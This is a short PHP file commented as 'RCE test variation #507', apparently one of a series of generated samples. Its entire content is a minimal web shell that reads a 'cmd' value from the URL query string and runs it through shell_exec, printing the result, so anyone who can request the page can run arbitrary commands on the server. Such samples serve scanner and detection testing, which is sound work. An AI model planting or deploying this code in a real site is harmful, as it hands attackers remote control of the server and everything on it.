<?php
// RCE test variation #507
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>